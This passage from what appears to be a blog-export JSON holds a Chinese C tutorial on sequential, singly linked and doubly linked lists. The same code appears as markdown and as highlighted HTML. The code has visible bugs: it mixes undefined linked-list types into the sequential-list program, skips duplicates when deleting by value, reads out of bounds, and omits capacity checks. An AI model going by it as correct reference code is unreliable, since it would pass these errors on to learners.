if(p->data==targetData)\n        {\n            printf(\"Position:%d.\\n\",index);\n            return index;\n        }\n        index++;\n        p=p->next;\n    }\n    printf(\"No such a data.\\n\");\n    return -1;\n}\n\n//计算链表长度\nint CountLinklistLength(Linklist L)\n{\n    int count=0;\n    LNode *p;\n    p=L->next;\n    while(p)\n    {\n        count++;\n        p=p->next;\n    }\n    printf(\"List length : %d.\\n\",count);\n    return count;\n}\n\nvoid PrintList(Sqlist *L)\n{\n    printf(\"The list is below:\\n\");\n    for(int index=0;index<L->length;index++)\n    {\n        printf(\"%d \",L->data[index]);\n    }\n    printf(\"\\nThe length is %d\\n\",L->length);\n    return;\n}\n\n//不确定是否正确\n// void EmptyList(Sqlist *L)\n// {\n//     free(L->data);\n//     L->length=0;\n//     return;\n// }\n\n\n\nint main(){\n    int my_data[MAXSIZE]={1,2,3,4,5,6,4,3,22,1};\n    int my_length=10;\n    Sqlist my_list;\n    Elemtype insertData=10;\n    int my_new_position=3;\n    int my_abandoned_data=3;\n    int my_deleted_position=2;\n\n    InitSqlist(&my_list);\n    CreateSqlist(&my_list,my_data,my_length);\n    InsertList(&my_list,insertData,my_new_position);\n    PrintList(&my_list);\n    DeleteDataByElement(&my_list,my_abandoned_data);\n    DeleteDataByPosition(&my_list,my_deleted_position);\n    // EmptyList(&my_list);\n    PrintList(&my_list);\n    return 0;\n}\n```\n\n统一使用头节点后的代码实现：\n\n```csharp\nLinklist Create_Linklist(int n)\n{\n    LNode *L,*p,*q;\n    int i;\n    L=(LNode*)malloc(sizeof(LNode));\n    L->next=NULL;           //Head node;\n    q=L;                    //q->L;\n    for(i=0;i<n;i++)\n    {\n        p=(LNode*)malloc(sizeof(LNode));\n        printf(\"Pelase enter data %d:\",i);\n        scanf(\"%d\",&p->data);\t\t\t //q=L,p赋值\n        p->next=NULL;\t\t\t\t\t//q=L, p->NULL\n        q->next=p;\t\t\t\t\t\t//q->p->NULL==L->p->null;\n        q=p;\t\t\t\t\t\t\t\n    }\t\t\t\t\t\t\t\t\t\n    return L;\n}\n\nint InsertData(Linklist L,ElemType data,int pos)\n{\n    LNode *p,*s;\n    int index;\n    p=L;\n    index=-1;\t\t\t\t\t\t//index设置为-1，则从0开始计算链表长度\n    while(p&&index<pos-1)\t\t\t//循环找到目标元素的前一个元素\n    {\n        p=p->next;\n        index++;\n    }\n    if(!p||index>pos-1)\t\t\t\t//p的下一个为空则不存在；index大于pos则出错；\n    {\n        printf(\"Wrong position.\\n\");\n        return -1;\n    }\n    s=(LNode*)malloc(sizeof(LNode));\t//创建新空间\n    s->data=data;\t\t\t\t\t\n    s->next=p->next;\t\t\t//s=target\n    p->next=s;\t\t\t\t\t//p->s,s->target\n    printf(\"Insert the data successfully.\\n\");\n    return 1;\n}\n\nint DeleteData(Linklist L,ElemType *e,int pos)   //*e可以获得目标元素的地址\n{\n    LNode *p,*q;\n    p=L->next;\t\t\t\t\t\t\t\n    int index=-1;\n    while(p->next&&index<pos-1)\n    {\n        p=p->next;\n        index++;\n    }\n    if(!(p->next)||index>pos-1)\n    {\n        printf(\"Wrong position.\\n\");\n        return -1;\n    }\n    q=p->next;\n    *e=q->data;\t\t\t\t\t//将data传入e\n    p->next=q->next;\n    free(q);\n    printf(\"Get the data: %d\\n\",*e);\n    return 1;\n\n}\n\n//合并两个有序链表，且合成的链表也是顺序的\nLinklist MergeLinklist(Linklist A,Linklist B)\n{\n    LNode *pa,*pb,*pc,*C;\n    pa=A->next;\n    pb=B->next;\n    C=pc=A;\t\t\t\t\t\t//C=A\n    while(pa&&pb)\n    {\n        if(pa->data<=pb->data)\n        {\n            pc->next=pa;\t\t//c->a1;\n            pc=pa;\t\t\t\t//c=a1;\n            pa=pa->next;\t\t//a1=a2\n        }\n        else\n        {\n            pc->next=pb;\n            pc=pb;\n            pb=pb->next;\n        }\n    }\n    pc->next=pa?pa:pb;\n    free(B);\n    return C;\n\n}\n\nvoid PrintLinklist(Linklist L)\n{\n    LNode *p;\n    p=L->next;\n    printf(\"DATA OUTPUT:\");\n    while(p)\n    {\n        printf(\"%d \",p->data);\n        p=p->next;\n    }\n    printf(\"\\n\");\n}\n\nint main()\n{\n    int e;\n\n    Linklist MyLinklist;\n    MyLinklist=Create_Linklist(5);\n    PrintLinklist(MyLinklist);\n    InsertData(MyLinklist,101,3);\n    PrintLinklist(MyLinklist);\n    DeleteData(MyLinklist,&e,3);    //Use & to get data;\n    PrintLinklist(MyLinklist);\n\n\n\n    return 0;\n}\n```\n\n二、双向链表\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n\ntypedef int Elemtype;\n\n//节点结构\ntypedef struct DulNode{\n    struct DulNode * prior;\n    int data;\n    struct DulNode * next;\n}DulNode,*DulLinkList;\n\nDulNode* initDulNode(DulNode * L,int length){\n    //创建一个首元节点，链表的头指针为L\n    L=(DulNode*)malloc(sizeof(DulNode));\n    //对节点进行初始化\n    L->prior=NULL;\n    L->next=NULL;\n    L->data=NULL;\n    //声明一个指向首元节点的指针，方便后期向链表中添加新创建的节点\n    DulNode *r=L;\n    for (int count=0; count<length; count++) {\n        //创建新的节点并初始化\n        DulNode *p=(DulNode*)malloc(sizeof(DulNode));\n        p->prior=NULL;\n        p->next=NULL;\n        printf(\"Please enter data %d:\",count);\n        scanf(\"%d\",&p->data);\n        //新节点与链表最后一个节点建立关系\n        r->next=p;\n        p->prior=r;\n        //r永远指向链表中最后一个节点，重点！！！！\n        r=r->next;\n    }\n    //返回新创建的链表\n    return L;\n}\nvoid display(DulNode * L){\n    DulNode *temp=L->next;\n    while (temp) {\n        //如果该节点无后继节点，说明此节点是链表的最后一个节点\n        if (temp->next==NULL) {\n            printf(\"%d\\n\",temp->data);\n        }else{\n            printf(\"%d <-> \",temp->data);\n        }\n        temp=temp->next;\n    }\n}\n\n\nint main() {\n    //创建一个头指针\n    DulNode * L=NULL;\n    //调用链表创建函数\n    L=initDulNode(L,5);\n    //输出创建好的链表\n    display(L);\n    //显示双链表的优点\n    return 0;\n}\n\n\n```\n\n","source":"_posts/CH1 顺序表基本操作及实现（C）.md","raw":"---\ntitle: 顺序表\ndate: 2021-08-08 20:57:45\ncategories: \n    - 编程\ntags: \n    - C语言\nmp3: \ncover: img/bg1.jpg\n---\n\nCH1 顺序表基本操作及实现（C）\n\n```csharp\n#include<stdio.h>\n#include<stdlib.h>\n\n#define MAXSIZE 50\n#define Elemtype int \n\ntypedef struct{\n    Elemtype data[MAXSIZE];\n    int length;\n}Sqlist;\n\nvoid InitSqlist(Sqlist *L)\n{\n    L->length=0;\n    printf(\"Init the list successfully!\\n\");\n    return;\n}\n\nvoid CreateSqlist(Sqlist *L,int temp_data[],int temp_length)\n{\n    if(temp_length>MAXSIZE)\n    {\n        printf(\"Overflow!\\n\");\n        return;\n    }\n\n    for(int index=0;index<temp_length;index++)\n    {\n        L->data[index]=temp_data[index];\n    }\n    L->length=temp_length;\n    printf(\"Create the table successfully!\\n\");\n    return;\n}\n\nvoid InsertList(Sqlist *L,Elemtype newData,int temp_position)\n{\n    if(temp_position<0||temp_position>L->length+1)\n    {\n        printf(\"Wrong position!\\n\");\n        return;\n    }\n    else\n    {\n        for(int index=L->length;index>temp_position;index--)\n        {\n            L->data[index]=L->data[index-1];\n        }\n        L->data[temp_position]=newData;\n        printf(\"Add new data successfully!\\n\");\n        return;\n    }\n}\n\nvoid DeleteDataByElement(Sqlist *L,Elemtype deletedData)\n{\n    int counter=0;\n    for(int index=0;index<L->length-1;index++)\n    {\n        if(L->data[index]==deletedData)\n        {\n            counter+=1;\n            for(int index1=index;index1<L->length-1;index1++)\n            {\n                L->data[index1]=L->data[index1+1];\n            }\n        }\n    }\n    L->length-=counter;\n    printf(\"The counter is %d\\n\",counter);\n    printf(\"Delete the data successfully!\\n\");\n    return;\n}\n\nvoid DeleteDataByPosition(Sqlist *L,int tempDeletePosition)\n{\n    Elemtype deleted_data;\n    if(tempDeletePosition<0||tempDeletePosition>L->length)\n    {\n        printf(\"Wrong position!\\n\");\n    }\n    else{\n        deleted_data=L->data[tempDeletePosition];\n        for(int index=tempDeletePosition;index<L->length;index++)\n        {\n\n            L->data[index]=L->data[index+1];\n        }\n        L->length--;\n    }\n    printf(\"Delete the data successfully!\\n\");\n    printf(\"The deleted data is %d\\n\",deleted_data);\n    return;\n}\n\n//按值查找\nint Locate_Data(Linklist L,ElemType targetData)\n{\n    LNode *p;\n    p=L->next;\n    int index=0;\n    while(p)\n    {\n        if(p->data==targetData)\n        {\n            printf(\"Position:%d.\\n\",index);\n            return index;\n        }\n        index++;\n        p=p->next;\n    }\n    printf(\"No such a data.\\n\");\n    return -1;\n}\n\n//计算链表长度\nint CountLinklistLength(Linklist L)\n{\n    int count=0;\n    LNode *p;\n    p=L->next;\n    while(p)\n    {\n        count++;\n        p=p->next;\n    }\n    printf(\"List length : %d.\\n\",count);\n    return count;\n}\n\nvoid PrintList(Sqlist *L)\n{\n    printf(\"The list is below:\\n\");\n    for(int index=0;index<L->length;index++)\n    {\n        printf(\"%d \",L->data[index]);\n    }\n    printf(\"\\nThe length is %d\\n\",L->length);\n    return;\n}\n\n//不确定是否正确\n// void EmptyList(Sqlist *L)\n// {\n//     free(L->data);\n//     L->length=0;\n//     return;\n// }\n\n\n\nint main(){\n    int my_data[MAXSIZE]={1,2,3,4,5,6,4,3,22,1};\n    int my_length=10;\n    Sqlist my_list;\n    Elemtype insertData=10;\n    int my_new_position=3;\n    int my_abandoned_data=3;\n    int my_deleted_position=2;\n\n    InitSqlist(&my_list);\n    CreateSqlist(&my_list,my_data,my_length);\n    InsertList(&my_list,insertData,my_new_position);\n    PrintList(&my_list);\n    DeleteDataByElement(&my_list,my_abandoned_data);\n    DeleteDataByPosition(&my_list,my_deleted_position);\n    // EmptyList(&my_list);\n    PrintList(&my_list);\n    return 0;\n}\n```\n\n统一使用头节点后的代码实现：\n\n```csharp\nLinklist Create_Linklist(int n)\n{\n    LNode *L,*p,*q;\n    int i;\n    L=(LNode*)malloc(sizeof(LNode));\n    L->next=NULL;           //Head node;\n    q=L;                    //q->L;\n    for(i=0;i<n;i++)\n    {\n        p=(LNode*)malloc(sizeof(LNode));\n        printf(\"Pelase enter data %d:\",i);\n        scanf(\"%d\",&p->data);\t\t\t //q=L,p赋值\n        p->next=NULL;\t\t\t\t\t//q=L, p->NULL\n        q->next=p;\t\t\t\t\t\t//q->p->NULL==L->p->null;\n        q=p;\t\t\t\t\t\t\t\n    }\t\t\t\t\t\t\t\t\t\n    return L;\n}\n\nint InsertData(Linklist L,ElemType data,int pos)\n{\n    LNode *p,*s;\n    int index;\n    p=L;\n    index=-1;\t\t\t\t\t\t//index设置为-1，则从0开始计算链表长度\n    while(p&&index<pos-1)\t\t\t//循环找到目标元素的前一个元素\n    {\n        p=p->next;\n        index++;\n    }\n    if(!p||index>pos-1)\t\t\t\t//p的下一个为空则不存在；index大于pos则出错；\n    {\n        printf(\"Wrong position.\\n\");\n        return -1;\n    }\n    s=(LNode*)malloc(sizeof(LNode));\t//创建新空间\n    s->data=data;\t\t\t\t\t\n    s->next=p->next;\t\t\t//s=target\n    p->next=s;\t\t\t\t\t//p->s,s->target\n    printf(\"Insert the data successfully.\\n\");\n    return 1;\n}\n\nint DeleteData(Linklist L,ElemType *e,int pos)   //*e可以获得目标元素的地址\n{\n    LNode *p,*q;\n    p=L->next;\t\t\t\t\t\t\t\n    int index=-1;\n    while(p->next&&index<pos-1)\n    {\n        p=p->next;\n        index++;\n    }\n    if(!(p->next)||index>pos-1)\n    {\n        printf(\"Wrong position.\\n\");\n        return -1;\n    }\n    q=p->next;\n    *e=q->data;\t\t\t\t\t//将data传入e\n    p->next=q->next;\n    free(q);\n    printf(\"Get the data: %d\\n\",*e);\n    return 1;\n\n}\n\n//合并两个有序链表，且合成的链表也是顺序的\nLinklist MergeLinklist(Linklist A,Linklist B)\n{\n    LNode *pa,*pb,*pc,*C;\n    pa=A->next;\n    pb=B->next;\n    C=pc=A;\t\t\t\t\t\t//C=A\n    while(pa&&pb)\n    {\n        if(pa->data<=pb->data)\n        {\n            pc->next=pa;\t\t//c->a1;\n            pc=pa;\t\t\t\t//c=a1;\n            pa=pa->next;\t\t//a1=a2\n        }\n        else\n        {\n            pc->next=pb;\n            pc=pb;\n            pb=pb->next;\n        }\n    }\n    pc->next=pa?pa:pb;\n    free(B);\n    return C;\n\n}\n\nvoid PrintLinklist(Linklist L)\n{\n    LNode *p;\n    p=L->next;\n    printf(\"DATA OUTPUT:\");\n    while(p)\n    {\n        printf(\"%d \",p->data);\n        p=p->next;\n    }\n    printf(\"\\n\");\n}\n\nint main()\n{\n    int e;\n\n    Linklist MyLinklist;\n    MyLinklist=Create_Linklist(5);\n    PrintLinklist(MyLinklist);\n    InsertData(MyLinklist,101,3);\n    PrintLinklist(MyLinklist);\n    DeleteData(MyLinklist,&e,3);    //Use & to get data;\n    PrintLinklist(MyLinklist);\n\n\n\n    return 0;\n}\n```\n\n二、双向链表\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n\ntypedef int Elemtype;\n\n//节点结构\ntypedef struct DulNode{\n    struct DulNode * prior;\n    int data;\n    struct DulNode * next;\n}DulNode,*DulLinkList;\n\nDulNode* initDulNode(DulNode * L,int length){\n    //创建一个首元节点，链表的头指针为L\n    L=(DulNode*)malloc(sizeof(DulNode));\n    //对节点进行初始化\n    L->prior=NULL;\n    L->next=NULL;\n    L->data=NULL;\n    //声明一个指向首元节点的指针，方便后期向链表中添加新创建的节点\n    DulNode *r=L;\n    for (int count=0; count<length; count++) {\n        //创建新的节点并初始化\n        DulNode *p=(DulNode*)malloc(sizeof(DulNode));\n        p->prior=NULL;\n        p->next=NULL;\n        printf(\"Please enter data %d:\",count);\n        scanf(\"%d\",&p->data);\n        //新节点与链表最后一个节点建立关系\n        r->next=p;\n        p->prior=r;\n        //r永远指向链表中最后一个节点，重点！！！！\n        r=r->next;\n    }\n    //返回新创建的链表\n    return L;\n}\nvoid display(DulNode * L){\n    DulNode *temp=L->next;\n    while (temp) {\n        //如果该节点无后继节点，说明此节点是链表的最后一个节点\n        if (temp->next==NULL) {\n            printf(\"%d\\n\",temp->data);\n        }else{\n            printf(\"%d <-> \",temp->data);\n        }\n        temp=temp->next;\n    }\n}\n\n\nint main() {\n    //创建一个头指针\n    DulNode * L=NULL;\n    //调用链表创建函数\n    L=initDulNode(L,5);\n    //输出创建好的链表\n    display(L);\n    //显示双链表的优点\n    return 0;\n}\n\n\n```\n\n","slug":"CH1 顺序表基本操作及实现（C）","published":1,"updated":"2021-08-15T14:55:04.000Z","_id":"clg29vygv002nao9cdfmy2dsn","comments":1,"layout":"post","photos":[],"link":"","content":"<p>CH1 顺序表基本操作及实现（C）</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs csharp\"><span class=\"hljs-meta\">#include&lt;stdio.h&gt;</span><br><span class=\"hljs-meta\">#include&lt;stdlib.h&gt;</span><br><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> MAXSIZE 50</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> Elemtype int </span><br><br>typedef <span class=\"hljs-keyword\">struct</span>&#123;<br>    Elemtype data[MAXSIZE];<br>    <span class=\"hljs-built_in\">int</span> length;<br>&#125;Sqlist;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">InitSqlist</span>(<span class=\"hljs-params\">Sqlist *L</span>)</span><br>&#123;<br>    L-&gt;length=<span class=\"hljs-number\">0</span>;<br>    printf(<span class=\"hljs-string\">&quot;Init the list successfully!\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">CreateSqlist</span>(<span class=\"hljs-params\">Sqlist *L,<span class=\"hljs-built_in\">int</span> temp_data[],<span class=\"hljs-built_in\">int</span> temp_length</span>)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(temp_length&gt;MAXSIZE)<br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;Overflow!\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> index=<span class=\"hljs-number\">0</span>;index&lt;temp_length;index++)<br>    &#123;<br>        L-&gt;data[index]=temp_data[index];<br>    &#125;<br>    L-&gt;length=temp_length;<br>    printf(<span class=\"hljs-string\">&quot;Create the table successfully!\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">InsertList</span>(<span class=\"hljs-params\">Sqlist *L,Elemtype newData,<span class=\"hljs-built_in\">int</span> temp_position</span>)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(temp_position&lt;<span class=\"hljs-number\">0</span>||temp_position&gt;L-&gt;length+<span class=\"hljs-number\">1</span>)<br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;Wrong position!\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span><br>    &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> index=L-&gt;length;index&gt;temp_position;index--)<br>        &#123;<br>            L-&gt;data[index]=L-&gt;data[index<span class=\"hljs-number\">-1</span>];<br>        &#125;<br>        L-&gt;data[temp_position]=newData;<br>        printf(<span class=\"hljs-string\">&quot;Add new data successfully!\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">DeleteDataByElement</span>(<span class=\"hljs-params\">Sqlist *L,Elemtype deletedData</span>)</span><br>&#123;<br>    <span class=\"hljs-built_in\">int</span> counter=<span class=\"hljs-number\">0</span>;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> index=<span class=\"hljs-number\">0</span>;index&lt;L-&gt;length<span class=\"hljs-number\">-1</span>;index++)<br>    &#123;<br>        <span class=\"hljs-keyword\">if</span>(L-&gt;data[index]==deletedData)<br>        &#123;<br>            counter+=<span class=\"hljs-number\">1</span>;<br>            <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> index1=index;index1&lt;L-&gt;length<span class=\"hljs-number\">-1</span>;index1++)<br>            &#123;<br>                L-&gt;data[index1]=L-&gt;data[index1+<span class=\"hljs-number\">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br>    L-&gt;length-=counter;<br>    printf(<span class=\"hljs-string\">&quot;The counter is %d\\n&quot;</span>,counter);<br>    printf(<span class=\"hljs-string\">&quot;Delete the data successfully!\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">DeleteDataByPosition</span>(<span class=\"hljs-params\">Sqlist *L,<span class=\"hljs-built_in\">int</span> tempDeletePosition</span>)</span><br>&#123;<br>    Elemtype deleted_data;<br>    <span class=\"hljs-keyword\">if</span>(tempDeletePosition&lt;<span class=\"hljs-number\">0</span>||tempDeletePosition&gt;L-&gt;length)<br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;Wrong position!\\n&quot;</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span>&#123;<br>        deleted_data=L-&gt;data[tempDeletePosition];<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> index=tempDeletePosition;index&lt;L-&gt;length;index++)<br>        &#123;<br><br>            L-&gt;data[index]=L-&gt;data[index+<span class=\"hljs-number\">1</span>];<br>        &#125;<br>        L-&gt;length--;<br>    &#125;<br>    printf(<span class=\"hljs-string\">&quot;Delete the data successfully!\\n&quot;</span>);<br>    printf(<span class=\"hljs-string\">&quot;The deleted data is %d\\n&quot;</span>,deleted_data);<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br><span class=\"hljs-comment\">//按值查找</span><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">Locate_Data</span>(<span class=\"hljs-params\">Linklist L,ElemType targetData</span>)</span><br>&#123;<br>    LNode *p;<br>    p=L-&gt;next;<br>    <span class=\"hljs-built_in\">int</span> index=<span class=\"hljs-number\">0</span>;<br>    <span class=\"hljs-keyword\">while</span>(p)<br>    &#123;<br>        <span class=\"hljs-keyword\">if</span>(p-&gt;data==targetData)<br>        &#123;<br>            printf(<span class=\"hljs-string\">&quot;Position:%d.\\n&quot;</span>,index);<br>            <span class=\"hljs-keyword\">return</span> index;<br>        &#125;<br>        index++;<br>        p=p-&gt;next;<br>    &#125;<br>    printf(<span class=\"hljs-string\">&quot;No such a data.\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>&#125;<br><br><span class=\"hljs-comment\">//计算链表长度</span><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">CountLinklistLength</span>(<span class=\"hljs-params\">Linklist L</span>)</span><br>&#123;<br>    <span class=\"hljs-built_in\">int</span> count=<span class=\"hljs-number\">0</span>;<br>    LNode *p;<br>    p=L-&gt;next;<br>    <span class=\"hljs-keyword\">while</span>(p)<br>    &#123;<br>        count++;<br>        p=p-&gt;next;<br>    &#125;<br>    printf(<span class=\"hljs-string\">&quot;List length : %d.\\n&quot;</span>,count);<br>    <span class=\"hljs-keyword\">return</span> count;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">PrintList</span>(<span class=\"hljs-params\">Sqlist *L</span>)</span><br>&#123;<br>    printf(<span class=\"hljs-string\">&quot;The list is below:\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> index=<span class=\"hljs-number\">0</span>;index&lt;L-&gt;length;index++)<br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;%d &quot;</span>,L-&gt;data[index]);<br>    &#125;<br>    printf(<span class=\"hljs-string\">&quot;\\nThe length is %d\\n&quot;</span>,L-&gt;length);<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br><span class=\"hljs-comment\">//不确定是否正确</span><br><span class=\"hljs-comment\">// void EmptyList(Sqlist *L)</span><br><span class=\"hljs-comment\">// &#123;</span><br><span class=\"hljs-comment\">//     free(L-&gt;data);</span><br><span class=\"hljs-comment\">//     L-&gt;length=0;</span><br><span class=\"hljs-comment\">//     return;</span><br><span class=\"hljs-comment\">// &#125;</span><br><br><br><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">main</span>()</span>&#123;<br>    <span class=\"hljs-built_in\">int</span> my_data[MAXSIZE]=&#123;<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span>,<span class=\"hljs-number\">6</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">1</span>&#125;;<br>    <span class=\"hljs-built_in\">int</span> my_length=<span class=\"hljs-number\">10</span>;<br>    Sqlist my_list;<br>    Elemtype insertData=<span class=\"hljs-number\">10</span>;<br>    <span class=\"hljs-built_in\">int</span> my_new_position=<span class=\"hljs-number\">3</span>;<br>    <span class=\"hljs-built_in\">int</span> my_abandoned_data=<span class=\"hljs-number\">3</span>;<br>    <span class=\"hljs-built_in\">int</span> my_deleted_position=<span class=\"hljs-number\">2</span>;<br><br>    InitSqlist(&amp;my_list);<br>    CreateSqlist(&amp;my_list,my_data,my_length);<br>    InsertList(&amp;my_list,insertData,my_new_position);<br>    PrintList(&amp;my_list);<br>    DeleteDataByElement(&amp;my_list,my_abandoned_data);<br>    DeleteDataByPosition(&amp;my_list,my_deleted_position);<br>    <span class=\"hljs-comment\">// EmptyList(&amp;my_list);</span><br>    PrintList(&amp;my_list);<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>统一使用头节点后的代码实现：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span 